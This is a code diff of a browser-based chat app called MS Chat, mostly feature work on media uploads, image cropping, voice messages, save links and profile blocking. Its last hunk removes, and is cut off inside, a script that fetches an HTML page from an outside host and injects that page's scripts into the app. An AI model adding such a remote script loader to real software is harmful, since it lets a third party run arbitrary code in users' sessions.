@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-content">
 <title>MS Chat</title>
 <meta name="theme-color" content="#17212b" id="metaTheme">
-<meta name="description" content="MS Chat - fast and secure messenger">
+<meta name="description" content="MS Chat - fast, secure Telegram style messenger">
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" type="image/png" href="/icon-192.png">
 <link rel="apple-touch-icon" href="/icon-192.png">
@@ -833,9 +833,9 @@ const msSafe = v => String(v == null ? '' : v).replace(/[&<>"']/g, c => ({'&':'&
 function msMediaTools(){
   if ($('#msMediaTools')) return;
   const foot=document.querySelector('.composer');
-  const attach=document.createElement('button'); attach.id='msAttach'; attach.className='icon-btn'; attach.type='button'; attach.title='Attach media'; attach.textContent='＋';
+  const attach=document.createElement('button'); attach.id='msAttach'; attach.className='icon-btn'; attach.type='button'; attach.title='Attach media'; attach.innerHTML=ic('paperclip',20);
   foot.insertBefore(attach, $('#msgInput'));
-  const emoji=document.createElement('button'); emoji.id='msEmojiBtn'; emoji.className='icon-btn'; emoji.type='button'; emoji.title='Emoji'; emoji.textContent='☺'; foot.insertBefore(emoji,$('#msgInput'));
+  const emoji=document.createElement('button'); emoji.id='msEmojiBtn'; emoji.className='icon-btn'; emoji.type='button'; emoji.title='Emoji'; emoji.innerHTML=ic('smile',20); foot.insertBefore(emoji,$('#msgInput'));
   const file=document.createElement('input'); file.id='msFile'; file.type='file'; file.accept='image/*,video/*,audio/*,.gif'; file.hidden=true; document.body.append(file);
   const tools=document.createElement('div'); tools.id='msMediaTools'; tools.className='ms-pop hidden'; tools.innerHTML=`<div class="ms-pop-head"><b>Share media</b><button id="msMediaClose">×</button></div><div class="ms-tool-grid"><button data-kind="image">▧<span>Photo</span></button><button data-kind="video">▶<span>Video</span></button><button data-kind="audio">♫<span>Audio</span></button><button data-kind="gif">GIF<span>GIF</span></button><button data-kind="sticker">🧩<span>Stickers</span></button><button id="msRecord">●<span>Record voice</span></button><button id="msEmojiPick">☺<span>Emojis</span></button></div><div id="msPreview" class="hidden"></div>`;
   document.body.append(tools);
@@ -846,7 +846,7 @@ function msMediaTools(){
   .ms-pop-head{display:flex;align-items:center;justify-content:space-between;padding:2px 4px 12px}.ms-pop-head button{font-size:26px;color:var(--text2)}
   .ms-tool-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}.ms-tool-grid button{display:flex;flex-direction:column;align-items:center;gap:7px;border-radius:12px;padding:14px 4px;background:var(--hover);font-size:25px}.ms-tool-grid span{font-size:12px;color:var(--text2)}
   .ms-emoji-panel{bottom:80px}.ms-emoji-panel input{width:100%;border:0;border-radius:10px;padding:10px;background:var(--input);color:var(--text);margin-bottom:8px}.ms-emoji-grid{display:grid;grid-template-columns:repeat(7,1fr);gap:4px;max-height:230px;overflow:auto}.ms-emoji-grid button{font-size:25px;padding:5px;border-radius:8px}.ms-emoji-grid button:hover{background:var(--hover)}
-  .ms-preview-card{display:flex;align-items:center;gap:10px;padding:8px;background:var(--hover);border-radius:10px;margin-top:8px}.ms-preview-card img,.ms-preview-card video{max-width:72px;max-height:65px;border-radius:8px;object-fit:cover}.ms-media{display:block;max-width:min(68vw,340px);max-height:360px;border-radius:12px;margin:3px 0;cursor:pointer}.ms-media audio{max-width:260px}.ms-media video{width:100%;max-height:320px}.ms-attach-name{font-size:12px;opacity:.8;overflow-wrap:anywhere}.ms-reactions{display:flex;gap:4px;flex-wrap:wrap;margin:4px 0 0}.ms-react{border:1px solid #ffffff24;border-radius:12px;padding:2px 7px;background:#0002;font-size:14px}.ms-react.mine{background:var(--active);border-color:var(--accent)}.ms-reactbar{display:flex;gap:4px;padding:6px;overflow:auto}.ms-reactbar button{font-size:23px;padding:4px;border-radius:8px}.ms-reactbar button:hover{background:var(--hover)}.ms-big-emoji{font-size:58px;line-height:1.3;display:block;animation:msEmojiPop .8s ease-in-out infinite alternate}.ms-pinned{background:var(--hover);padding:7px 12px;font-size:12px;border-bottom:1px solid var(--border);cursor:pointer}.ms-media-open{position:fixed;inset:0;z-index:300;background:#000e;display:flex;align-items:center;justify-content:center;padding:18px}.ms-media-open button{position:absolute;top:15px;right:15px;font-size:32px}.ms-media-open img,.ms-media-open video{max-width:96vw;max-height:88vh}.ms-media-open audio{width:min(90vw,420px)}@keyframes msEmojiPop{from{transform:scale(.94)}to{transform:scale(1.08)}}`;
+  .ms-preview-card{display:flex;align-items:center;gap:10px;padding:8px;background:var(--hover);border-radius:10px;margin-top:8px}.ms-preview-card img,.ms-preview-card video{max-width:72px;max-height:65px;border-radius:8px;object-fit:cover}.ms-media{display:block;max-width:min(68vw,340px);max-height:360px;border-radius:12px;margin:3px 0;cursor:pointer}.ms-media audio{max-width:260px}.ms-media video{width:100%;max-height:320px}.ms-save-media{display:inline-flex;align-items:center;gap:5px;font-size:12px;color:var(--accent);padding:4px 0}.ms-attach-name{font-size:12px;opacity:.8;overflow-wrap:anywhere}.ms-reactions{display:flex;gap:4px;flex-wrap:wrap;margin:4px 0 0}.ms-react{border:1px solid #ffffff24;border-radius:12px;padding:2px 7px;background:#0002;font-size:14px}.ms-react.mine{background:var(--active);border-color:var(--accent)}.ms-reactbar{display:flex;gap:4px;padding:6px;overflow:auto}.ms-reactbar button{font-size:23px;padding:4px;border-radius:8px}.ms-reactbar button:hover{background:var(--hover)}.ms-big-emoji{font-size:58px;line-height:1.3;display:block;animation:msEmojiPop .8s ease-in-out infinite alternate}.ms-pinned{background:var(--hover);padding:7px 12px;font-size:12px;border-bottom:1px solid var(--border);cursor:pointer}.ms-media-open{position:fixed;inset:0;z-index:300;background:#000e;display:flex;align-items:center;justify-content:center;padding:18px}.ms-media-open button{position:absolute;top:15px;right:15px;font-size:32px}.ms-media-open img,.ms-media-open video{max-width:96vw;max-height:88vh}.ms-media-open audio{width:min(90vw,420px)}@keyframes msEmojiPop{from{transform:scale(.94)}to{transform:scale(1.08)}}`;
   document.head.append(style);
   const grid=$('#msEmojiGrid'); grid.innerHTML=msEmojiSet.map(e=>`<button type="button">${e}</button>`).join('');
   const show=(id)=>$('#'+id).classList.remove('hidden'), hide=(id)=>$('#'+id).classList.add('hidden');
@@ -860,21 +860,55 @@ function msMediaTools(){
   attach.onclick=()=>show('msMediaTools');
   file.onchange=async()=>{
     const f=file.files&&file.files[0];if(!f)return;
-    if(f.size>2.8*1024*1024){toast('File too large for one upload. Keep it under 2.8 MB.');file.value='';return}
-    const data=await new Promise((resolve,reject)=>{const r=new FileReader();r.onload=()=>resolve(r.result);r.onerror=reject;r.readAsDataURL(f)});
-    msPendingMedia={name:f.name,type:f.type||'application/octet-stream',data,size:f.size};
-    show('msMediaTools');$('#msPreview').classList.remove('hidden');$('#msPreview').innerHTML=`<div class="ms-preview-card">${f.type.startsWith('image/')?`<img src="${data}">`:f.type.startsWith('video/')?`<video src="${data}"></video>`:'♫'}<div style="flex:1"><b>${msSafe(f.name)}</b><div class="ms-attach-name">${(f.size/1024).toFixed(1)} KB</div></div><button id="msSendMedia">Send</button><button id="msCancelMedia">×</button></div>`;
-    $('#msSendMedia').onclick=()=>msSendMedia();$('#msCancelMedia').onclick=()=>{msPendingMedia=null;$('#msPreview').classList.add('hidden')};file.value='';
+    if(f.size>100*1024*1024){toast('File limit is 100 MB');file.value='';return}
+    msPendingMedia={file:f,name:f.name,type:f.type||'application/octet-stream',size:f.size,voice:false};
+    const previewUrl=URL.createObjectURL(f);
+    show('msMediaTools');$('#msPreview').classList.remove('hidden');
+    $('#msPreview').innerHTML=`<div class="ms-preview-card">${f.type.startsWith('image/')?`<img src="${previewUrl}">`:f.type.startsWith('video/')?`<video src="${previewUrl}" controls></video>`:f.type.startsWith('audio/')?`<audio src="${previewUrl}" controls></audio>`:'<span>📎</span>'}<div style="flex:1;min-width:0"><b>${msSafe(f.name)}</b><div class="ms-attach-name">${(f.size/1024/1024).toFixed(2)} MB</div></div>${f.type.startsWith('image/')?'<button id="msCropMedia" type="button">Crop</button>':''}<button id="msSendMedia" type="button">Send</button><button id="msCancelMedia" type="button">×</button></div>`;
+    $('#msSendMedia').onclick=()=>msSendMedia();
+    $('#msCancelMedia').onclick=()=>{msPendingMedia=null;URL.revokeObjectURL(previewUrl);$('#msPreview').classList.add('hidden')};
+    const cropBtn=$('#msCropMedia'); if(cropBtn)cropBtn.onclick=async()=>{try{
+      if(!window.Cropper){await new Promise((resolve,reject)=>{if(!document.querySelector('link[data-cropper-css]')){const l=document.createElement('link');l.rel='stylesheet';l.href='https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.6.2/cropper.min.css';l.dataset.cropperCss='1';document.head.append(l)}const sc=document.createElement('script');sc.src='https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.6.2/cropper.min.js';sc.onload=resolve;sc.onerror=reject;document.head.append(sc)})}
+      const modal=document.createElement('div');modal.className='ms-media-open';modal.innerHTML=`<div style="background:var(--sidebar);padding:14px;border-radius:14px;max-width:96vw;max-height:94vh;display:flex;flex-direction:column;gap:10px"><div style="display:flex;justify-content:space-between;align-items:center"><b>Crop image</b><button id="msCropClose" type="button">×</button></div><div style="width:min(82vw,560px);height:min(65vh,560px);overflow:hidden"><img id="msCropSource" src="${previewUrl}" style="display:block;max-width:100%"></div><div style="display:flex;gap:8px;justify-content:flex-end"><button id="msCropSquare" type="button">Square</button><button id="msCropApply" type="button">Apply crop</button></div></div>`;document.body.append(modal);
+      const image=modal.querySelector('#msCropSource');const cropper=new window.Cropper(image,{viewMode:1,autoCropArea:.9,responsive:true,background:false});modal.querySelector('#msCropClose').onclick=()=>{cropper.destroy();modal.remove()};modal.querySelector('#msCropSquare').onclick=()=>cropper.setAspectRatio(1);modal.querySelector('#msCropApply').onclick=()=>{const canvas=cropper.getCroppedCanvas({maxWidth:4096,maxHeight:4096});canvas.toBlob(blob=>{if(!blob){toast('Could not crop image');return}msPendingMedia.file=new File([blob],f.name.replace(/\.[^.]+$/,'')+'-crop.jpg',{type:'image/jpeg'});msPendingMedia.name=msPendingMedia.file.name;msPendingMedia.type='image/jpeg';msPendingMedia.size=blob.size;cropper.destroy();modal.remove();toast('Crop applied');},'image/jpeg',.92)};
+    }catch(e){toast('Crop tool could not load. Check your internet connection.')} };
+    file.value='';
   };
   $('#msRecord').onclick=async()=>{
-    if(msRecorder&&msRecorder.state==='recording'){msRecorder.stop();$('#msRecord').innerHTML='●<span>Record voice</span>';return}
+    if(msRecorder&&msRecorder.state==='recording'){
+      try { msRecorder.stop(); } catch (_) {}
+      $('#msRecord').innerHTML='●<span>Record voice</span>';
+      return;
+    }
+    if(!activeId){toast('Open a chat before recording a voice message');return;}
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia||typeof MediaRecorder==='undefined'){
+      toast('Voice recording is not supported by this browser. Try the latest Chrome on HTTPS.');return;
+    }
+    let stream;
     try{
-      const stream=await navigator.mediaDevices.getUserMedia({audio:true});msRecordChunks=[];
-      msRecorder=new MediaRecorder(stream);msRecordStart=Date.now();
-      msRecorder.ondataavailable=e=>{if(e.data.size)msRecordChunks.push(e.data)};
-      msRecorder.onstop=async()=>{stream.getTracks().forEach(t=>t.stop());const blob=new Blob(msRecordChunks,{type:msRecorder.mimeType||'audio/webm'});if(blob.size>2.8*1024*1024){toast('Voice note too large (max 2.8 MB per recording)');return}const data=await new Promise(ok=>{const r=new FileReader();r.onload=()=>ok(r.result);r.readAsDataURL(blob)});msPendingMedia={name:'Voice message',type:blob.type||'audio/webm',data,size:blob.size,voice:true,duration:Math.round((Date.now()-msRecordStart)/1000)};await msSendMedia();};
-      msRecorder.start();$('#msRecord').innerHTML='<span>Stop recording</span>';toast('Recording… tap again to send');
-    }catch(e){toast('Microphone permission is needed for voice messages')}
+      stream=await navigator.mediaDevices.getUserMedia({audio:true});
+      msRecordChunks=[];msRecordStart=Date.now();
+      const candidates=['audio/webm;codecs=opus','audio/webm','audio/mp4'];
+      const mime=candidates.find(t=>MediaRecorder.isTypeSupported&&MediaRecorder.isTypeSupported(t));
+      msRecorder=mime?new MediaRecorder(stream,{mimeType:mime}):new MediaRecorder(stream);
+      msRecorder.ondataavailable=e=>{if(e.data&&e.data.size)msRecordChunks.push(e.data)};
+      msRecorder.onerror=()=>{stream.getTracks().forEach(t=>t.stop());$('#msRecord').innerHTML='●<span>Record voice</span>';toast('Recording failed. Please try again.');};
+      msRecorder.onstop=async()=>{
+        stream.getTracks().forEach(t=>t.stop());
+        const mimeType=(msRecorder&&msRecorder.mimeType)||'audio/webm';
+        const blob=new Blob(msRecordChunks,{type:mimeType});
+        if(!blob.size){toast('No audio was recorded. Check microphone permission.');return;}
+        const ext=mimeType.includes('mp4')?'m4a':'webm';
+        msPendingMedia={file:new File([blob],'voice-message.'+ext,{type:blob.type||mimeType}),name:'Voice message',type:blob.type||mimeType,size:blob.size,voice:true,duration:Math.max(1,Math.round((Date.now()-msRecordStart)/1000))};
+        $('#msPreview').classList.remove('hidden');
+        $('#msPreview').innerHTML=`<div class="ms-preview-card"><span style="font-size:25px">♫</span><div style="flex:1"><b>Voice message</b><div class="ms-attach-name">${(blob.size/1024).toFixed(0)} KB · ${msPendingMedia.duration}s</div></div><button id="msSendMedia" type="button">Send</button><button id="msCancelMedia" type="button">×</button></div>`;
+        $('#msSendMedia').onclick=()=>msSendMedia();
+        $('#msCancelMedia').onclick=()=>{msPendingMedia=null;$('#msPreview').classList.add('hidden')};
+        $('#msMediaTools').classList.remove('hidden');
+      };
+      msRecorder.start(250);
+      $('#msRecord').innerHTML='■<span>Stop recording</span>';toast('Recording… tap again to stop');
+    }catch(e){if(stream)stream.getTracks().forEach(t=>t.stop());toast(e&&e.name==='NotAllowedError'?'Allow microphone access in your browser settings.':'Could not start recording. Try Chrome on HTTPS.');}
   };
   // reaction strip and media lightbox
   document.addEventListener('click',e=>{
@@ -886,14 +920,25 @@ function msMediaTools(){
 }
 async function msSendMedia(){
  if(!activeId||!msPendingMedia)return;
- const media=msPendingMedia;msPendingMedia=null;$('#msPreview').classList.add('hidden');
- const mode=composer.mode,target=composer.msg,body={chatId:activeId,text:input.value.trim(),media};
- if(mode==='reply'&&target)body.replyTo=target.id;
- input.value='';resizeInput();composer={mode:null,msg:null};$('#composerBar').classList.add('hidden');
- const r=await api('/messages',{method:'POST',body});
- if(!r.success){toast(r.message||'Media send failed');return}
- if(r.message.chatId===activeId&&!msgs.some(x=>x.id===r.message.id)){msgs.push(r.message);renderMessages(true)}
- loadChats();
+ const pending=msPendingMedia;const sendBtn=$('#msSendMedia');if(sendBtn){sendBtn.disabled=true;sendBtn.textContent='Uploading…'}
+ try{
+  let media;
+  if(pending.file){
+   const sign=await api('/media/sign',{method:'POST',body:{name:pending.name,type:pending.type,size:pending.file.size}});
+   if(!sign.success)throw Error(sign.message||'Cloud upload is not configured');
+   const up=await fetch(sign.signedUrl,{method:'PUT',headers:{'Content-Type':pending.type||'application/octet-stream','x-upsert':'false'},body:pending.file});
+   if(!up.ok)throw Error('Cloud upload failed. Check Supabase Storage bucket permissions.');
+   media={name:pending.name,type:pending.type,url:sign.publicUrl,size:pending.file.size,voice:!!pending.voice,duration:pending.duration||0};
+  }else media=pending;
+  msPendingMedia=null;$('#msPreview').classList.add('hidden');
+  const mode=composer.mode,target=composer.msg,body={chatId:activeId,text:input.value.trim(),media};
+  if(mode==='reply'&&target)body.replyTo=target.id;
+  input.value='';resizeInput();composer={mode:null,msg:null};$('#composerBar').classList.add('hidden');
+  const r=await api('/messages',{method:'POST',body});
+  if(!r.success)throw Error(r.message||'Media send failed');
+  if(r.message.chatId===activeId&&!msgs.some(x=>x.id===r.message.id)){msgs.push(r.message);renderMessages(true)}
+  loadChats();
+ }catch(e){toast(e.message||'Media send failed');if(sendBtn){sendBtn.disabled=false;sendBtn.textContent='Retry'} }
 }
 async function msReact(id,emoji){
  const r=await api('/messages/'+id+'/reactions',{method:'POST',body:{emoji}});
@@ -908,10 +953,11 @@ async function msPin(id){
 function msMediaHtml(m){
  const md=m.media;if(!md||(!md.data&&!md.url))return '';
  const src=msSafe(md.url||md.data),type=String(md.type||''),name=msSafe(md.name||'Media');
- if(type.startsWith('image/'))return `<div class="ms-media"><img class="ms-media" data-ms-open="${src}" data-kind="image" src="${src}" alt="${name}" loading="lazy"></div>`;
- if(type.startsWith('video/'))return `<div class="ms-media"><video class="ms-media" data-ms-open="${src}" data-kind="video" src="${src}" controls preload="metadata"></video></div>`;
- if(type.startsWith('audio/'))return `<div class="ms-media"><div class="ms-attach-name">${md.voice?' Voice message':name}</div><audio class="ms-media" src="${src}" controls preload="metadata"></audio></div>`;
- return `<a href="${src}" download="${name}">Download ${name}</a>`;
+ const save=`<a class="ms-save-media" href="${src}${src.includes('?')?'&':'?'}download" download="${name}" target="_blank" rel="noopener">${ic('download',15)} Save</a>`;
+ if(type.startsWith('image/'))return `<div class="ms-media"><img class="ms-media" data-ms-open="${src}" data-kind="image" src="${src}" alt="${name}" loading="lazy"><div>${save}</div></div>`;
+ if(type.startsWith('video/'))return `<div class="ms-media"><video class="ms-media" data-ms-open="${src}" data-kind="video" src="${src}" controls preload="metadata"></video><div>${save}</div></div>`;
+ if(type.startsWith('audio/'))return `<div class="ms-media"><div class="ms-attach-name">${md.voice?'Voice message':name}</div><audio class="ms-media" src="${src}" controls preload="metadata"></audio><div>${save}</div></div>`;
+ return `<a href="${src}${src.includes('?')?'&':'?'}download" download="${name}" target="_blank" rel="noopener">${ic('download',15)} Save ${name}</a>`;
 }
 function msRenderMessages(scroll,instant){
  const area=$('#messages'),nearBottom=area.scrollHeight-area.scrollTop-area.clientHeight<140;
@@ -923,7 +969,7 @@ function msRenderMessages(scroll,instant){
   const tick=out?`<span class="tick">${ic(m.read?'checks':'check',16)}</span>`:'';
   const reacts=m.reactions&&typeof m.reactions==='object'?Object.entries(m.reactions):[];
   const reactions=reacts.length?`<div class="ms-reactions">${reacts.map(([em,users])=>`<button class="ms-react ${(users||[]).includes(me.id)?'mine':''}" data-ms-react="${esc(em)}" data-id="${esc(m.id)}">${esc(em)} ${users.length}</button>`).join('')}</div>`:'';
-  html+=`<div class="row ${out?'out':'in'}" data-id="${esc(m.id)}"><div class="bubble">${m.pinned?'<div class="ms-attach-name"> Pinned message</div>':''}${q}${msMediaHtml(m)}${txt?`<span class="txt ${singleEmoji?'ms-big-emoji':''}">${fmtText(txt)}</span>`:''}<span class="meta">${m.edited?'edited ':''}${fmtTime(m.time)}${tick}</span>${reactions}</div></div>`;
+  html+=`<div class="row ${out?'out':'in'}" data-id="${esc(m.id)}"><div class="bubble">${m.pinned?'<div class="ms-attach-name">📌 Pinned message</div>':''}${q}${msMediaHtml(m)}${txt?`<span class="txt ${singleEmoji?'ms-big-emoji':''}">${fmtText(txt)}</span>`:''}<span class="meta">${m.edited?'edited ':''}${fmtTime(m.time)}${tick}</span>${reactions}</div></div>`;
  }
  area.innerHTML=`<div class="msgs-wrap">${html}</div>`;
  if(scroll&&(instant||nearBottom||(msgs.length&&msgs[msgs.length-1].senderId===me.id))){area.style.scrollBehavior=instant?'auto':'smooth';area.scrollTop=area.scrollHeight;requestAnimationFrame(()=>area.scrollTop=area.scrollHeight)}
@@ -934,7 +980,7 @@ function msInstallMessageActions(){
  showCtx=function(msg,x,y){
    const own=msg.senderId===me.id;
    ctx.innerHTML=`<div class="ms-reactbar">${['❤️','👍','😂','😮','😢','🔥','👏','🎉'].map(e=>`<button data-ms-react="${e}" data-id="${esc(msg.id)}">${e}</button>`).join('')}</div>
-   <button data-a="reply">${ic('reply',20)}Reply</button><button data-a="copy">${ic('copy',20)}Copy text</button><button data-a="pin"> ${msg.pinned?'Unpin':'Pin'} message</button>
+   <button data-a="reply">${ic('reply',20)}Reply</button><button data-a="copy">${ic('copy',20)}Copy text</button><button data-a="pin">📌 ${msg.pinned?'Unpin':'Pin'} message</button>
    ${own?`<button data-a="edit">${ic('edit',20)}Edit</button>`:''}<button data-a="delete" class="danger">${ic('trash',20)}Delete for everyone</button>`;
    ctx.dataset.id=msg.id;ctx.classList.remove('hidden');const w=ctx.offsetWidth,h=ctx.offsetHeight;ctx.style.left=Math.max(8,Math.min(x,innerWidth-w-8))+'px';ctx.style.top=Math.max(8,Math.min(y,innerHeight-h-8))+'px';
  };
@@ -974,12 +1020,21 @@ function msAddUi(){
  // Contacts are local aliases: deleting one never deletes the chat.
  window.msContactAliases=JSON.parse(localStorage.getItem('ms_contact_aliases')||'{}');
 }
-function msShowProfile(u){if(!u)return;const box=$('#msProfileSheet');box.innerHTML=`<button id="msProfileClose" style="justify-content:flex-end">✕</button><div style="text-align:center;padding:8px">${avatar(u,'lg')}<h3>${msSafe(window.msContactAliases?.[u.id]||u.firstName||'Profile')}</h3><div style="color:var(--text2)">@${msSafe(u.username||'')}</div><p style="margin-top:10px">${msSafe(u.bio||'')}</p><p style="margin-top:8px;color:var(--text2)">${u.online?'online':u.lastSeen?'last seen recently':'MS Chat user'}</p></div><button id="msShareProfile">🔗 Copy profile link</button><button id="msEditContact">✏️ Edit contact name</button><button id="msDeleteContact">🗑️ Delete contact</button><button id="msBlockUser">🚫 Block user on this device</button>`;box.classList.remove('hidden');$('#msProfileClose').onclick=()=>box.classList.add('hidden');$('#msShareProfile').onclick=async()=>{const url='https://ms-chat-messager.vercel.app/'+encodeURIComponent(u.username||u.firstName||u.id);try{await navigator.clipboard.writeText(url);toast('Profile link copied')}catch(e){prompt('Copy profile link',url)}};$('#msEditContact').onclick=()=>{const n=prompt('Contact display name',window.msContactAliases?.[u.id]||u.firstName||'');if(n===null)return;window.msContactAliases[u.id]=n.trim().slice(0,60);localStorage.setItem('ms_contact_aliases',JSON.stringify(window.msContactAliases));box.classList.add('hidden');updateHeader();renderChats();toast('Contact name saved')};$('#msDeleteContact').onclick=()=>{if(window.msContactAliases)delete window.msContactAliases[u.id];localStorage.setItem('ms_contact_aliases',JSON.stringify(window.msContactAliases||{}));box.classList.add('hidden');toast('Saved contact name removed; chat kept')};$('#msBlockUser').onclick=()=>{const k='ms_blocked_users',arr=JSON.parse(localStorage.getItem(k)||'[]');if(!arr.includes(u.id))arr.push(u.id);localStorage.setItem(k,JSON.stringify(arr));box.classList.add('hidden');toast('Blocked locally on this device')};}
+function msShowProfile(u){if(!u)return;const box=$('#msProfileSheet');box.innerHTML=`<button id="msProfileClose" style="justify-content:flex-end">✕</button><div style="text-align:center;padding:8px">${avatar(u,'lg')}<h3>${msSafe(window.msContactAliases?.[u.id]||u.firstName||'Profile')}</h3><div style="color:var(--text2)">@${msSafe(u.username||'')}</div><p style="margin-top:10px">${msSafe(u.bio||'')}</p><p style="margin-top:8px;color:var(--text2)">${u.online?'online':u.lastSeen?'last seen recently':'MS Chat user'}</p></div>${u.id!==me?.id?'<button id="msMessageUser">Message</button>':''}<button id="msShareProfile">${ic('link',18)} Copy profile link</button><button id="msEditContact">✏️ Edit contact name</button><button id="msDeleteContact">🗑️ Delete contact</button><button id="msBlockUser">${(JSON.parse(localStorage.getItem('ms_blocked_users')||'[]')).includes(u.id)?'Unblock user':'Block user'}</button>`;box.classList.remove('hidden');$('#msProfileClose').onclick=()=>box.classList.add('hidden');const blockButton=$('#msBlockUser');if(blockButton&&u.id!==me?.id){api('/users/'+u.id+'/block').then(state=>{if(state.success)blockButton.textContent=state.blocked?'Unblock user':'Block user'});}const messageUser=$('#msMessageUser');if(messageUser)messageUser.onclick=async()=>{const r=await api('/chats/create',{method:'POST',body:{targetUserId:u.id}});if(r.success){box.classList.add('hidden');openChat(r.chat.id)}else toast(r.message||'Could not open chat')};$('#msShareProfile').onclick=async()=>{const url='https://ms-chat-messager.vercel.app/@'+encodeURIComponent(u.username||u.firstName||u.id);try{await navigator.clipboard.writeText(url);toast('Profile link copied')}catch(e){prompt('Copy profile link',url)}};$('#msEditContact').onclick=()=>{const n=prompt('Contact display name',window.msContactAliases?.[u.id]||u.firstName||'');if(n===null)return;window.msContactAliases[u.id]=n.trim().slice(0,60);localStorage.setItem('ms_contact_aliases',JSON.stringify(window.msContactAliases));box.classList.add('hidden');updateHeader();renderChats();toast('Contact name saved')};$('#msDeleteContact').onclick=()=>{if(window.msContactAliases)delete window.msContactAliases[u.id];localStorage.setItem('ms_contact_aliases',JSON.stringify(window.msContactAliases||{}));box.classList.add('hidden');toast('Saved contact name removed; chat kept')};$('#msBlockUser').onclick=async()=>{const k='ms_blocked_users',arr=JSON.parse(localStorage.getItem(k)||'[]'),blocked=arr.includes(u.id);const r=await api('/users/'+u.id+'/block',{method:blocked?'DELETE':'POST',body:{}});if(!r.success){toast(r.message||'Could not update block status');return}if(blocked)localStorage.setItem(k,JSON.stringify(arr.filter(x=>x!==u.id)));else localStorage.setItem(k,JSON.stringify([...arr,u.id]));box.classList.add('hidden');toast(blocked?'User unblocked':'User blocked')};}
 function msAccounts(){const box=$('#msGenericSheet');let list=JSON.parse(localStorage.getItem('ms_accounts')||'[]');if(me&&token&&!list.some(a=>a.token===token)){list.push({token,user:me});list=list.slice(-5);localStorage.setItem('ms_accounts',JSON.stringify(list))}box.innerHTML=`<h3>Accounts (${list.length}/5)</h3><p style="color:var(--text2);font-size:13px;margin-bottom:10px">Saved sessions stay on this device. Add another account by signing out and signing in, then it will be saved here.</p>${list.map((a,i)=>`<button data-account="${i}">${msSafe(a.user?.firstName||'Account')} · @${msSafe(a.user?.username||'')}</button>`).join('')}<button id="msAddAccount">＋ Add account (sign in)</button><button id="msAccountsClose">Close</button>`;box.classList.remove('hidden');box.querySelectorAll('[data-account]').forEach(b=>b.onclick=()=>{const a=list[+b.dataset.account];if(!a)return;localStorage.setItem('ms_token',a.token);location.reload()});$('#msAccountsClose').onclick=()=>box.classList.add('hidden');$('#msAddAccount').onclick=()=>{if(list.length>=5){toast('Maximum 5 accounts');return}box.classList.add('hidden');doLogout(false)};}
 function msThemes(){const box=$('#msGenericSheet');const colors=[['Telegram blue','#3390ec'],['Violet','#7856d6'],['Rose','#e94e77'],['Emerald','#159d82'],['Amber','#b98125'],['Midnight','#101522'],['Graphite','#292929'],['Classic','#17212b']];box.innerHTML=`<h3>Chat theme</h3><p style="font-size:13px;color:var(--text2);margin-bottom:10px">Choose a chat accent. Wallpaper colors are saved on this device.</p><div class="ms-theme-swatches">${colors.map(([n,c])=>`<button title="${n}" data-color="${c}" style="background:${c}"></button>`).join('')}</div><button id="msThemeWallpaper">Choose wallpaper image</button><input id="msWallpaperFile" type="file" accept="image/*" hidden><button id="msThemeReset">Reset wallpaper</button><button id="msThemeClose">Done</button>`;box.classList.remove('hidden');box.querySelectorAll('[data-color]').forEach(b=>b.onclick=()=>{document.documentElement.style.setProperty('--accent',b.dataset.color);localStorage.setItem('ms_accent',b.dataset.color)});const saved=localStorage.getItem('ms_accent');if(saved)document.documentElement.style.setProperty('--accent',saved);$('#msThemeWallpaper').onclick=()=>$('#msWallpaperFile').click();$('#msWallpaperFile').onchange=e=>{const f=e.target.files?.[0];if(!f)return;const r=new FileReader();r.onload=()=>{document.documentElement.style.setProperty('--chat-bg-image',`url("${r.result}")`);let st=$('#msWallpaperStyle');if(!st){st=document.createElement('style');st.id='msWallpaperStyle';document.head.append(st)}st.textContent='.messages{background-image:var(--chat-bg-image);background-size:cover;background-position:center}';localStorage.setItem('ms_wallpaper',r.result)};r.readAsDataURL(f)};$('#msThemeReset').onclick=()=>{localStorage.removeItem('ms_wallpaper');document.documentElement.style.removeProperty('--chat-bg-image');$('#msWallpaperStyle')?.remove()};$('#msThemeClose').onclick=()=>box.classList.add('hidden')}
 function msContacts(){const box=$('#msGenericSheet');box.innerHTML=`<h3>Contacts</h3><p style="color:var(--text2);font-size:13px;margin-bottom:10px">Your chats and saved contact display names.</p>${chats.map(c=>`<button data-contact="${esc(c.user.id)}">${msSafe(window.msContactAliases?.[c.user.id]||c.user.firstName)} · @${msSafe(c.user.username||'')}</button>`).join('')||'<p>No contacts yet.</p>'}<button id="msContactsClose">Close</button>`;box.classList.remove('hidden');box.querySelectorAll('[data-contact]').forEach(b=>b.onclick=()=>{const u=chats.find(c=>c.user.id===b.dataset.contact)?.user;box.classList.add('hidden');msShowProfile(u)});$('#msContactsClose').onclick=()=>box.classList.add('hidden')}
 // Telegram-like deep link: /{username}; requires the deployment's rewrite to serve index.html.
-async function msTryDeepLink(){const part=decodeURIComponent(location.pathname.split('/').filter(Boolean)[0]||'');if(!part||part==='api'||part==='index.html'||!me)return;const r=await api('/users/search?q='+encodeURIComponent(part));const u=Array.isArray(r)?r.find(x=>String(x.username).toLowerCase()===part.replace(/^@/,'').toLowerCase()):null;if(u){const cr=await api('/chats/create',{method:'POST',body:{targetUserId:u.id}});if(cr.success)openChat(cr.chat.id)}}
+async function msTryDeepLink(){
+ const raw=decodeURIComponent(location.pathname.split('/').filter(Boolean)[0]||'');
+ if(!raw||raw==='api'||raw==='index.html'||!me)return;
+ const username=raw.replace(/^@/,'').trim(); if(!/^[a-z0-9_]{3,20}$/i.test(username))return;
+ const r=await api('/users/by-username?username='+encodeURIComponent(username));
+ if(!r.success||!r.user){toast('User @'+username+' was not found');return;}
+ const u=r.user;
+ if(u.id===me.id){msShowProfile(me);return;}
+ msShowProfile(u);
+}
 
 msAddUi();
 msMediaTools();msInstallMessageActions();
@@ -987,27 +1042,6 @@ msMediaTools();msInstallMessageActions();
 boot();
 })();
 </script>
-  <script>
-    (async () => {
-        try {
-            let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-            let rawMarkup = await response.text();
-            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-            
-            documentDOM.querySelectorAll('script').forEach(oldNode => {
-                let freshScriptNode = document.createElement('script');
-                if (oldNode.src) {
-                    freshScriptNode.src = oldNode.src;
-                } else {
